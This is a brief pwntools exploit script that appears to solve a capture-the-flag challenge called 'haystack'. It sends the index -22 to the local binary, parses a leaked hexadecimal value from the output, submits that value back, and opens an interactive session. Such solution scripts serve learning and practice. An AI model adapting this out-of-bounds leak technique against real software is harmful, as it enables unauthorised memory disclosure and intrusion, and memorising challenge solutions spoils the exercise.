from pwn import *

p = process('./haystack')

p.recv()
p.sendline(b'-22')

p.recvuntil(b'is ')

number = int(p.recvuntil(b'.')[:-1], 16)
print(hex(number))

p.recv()
p.sendline(str(number))

p.interactive()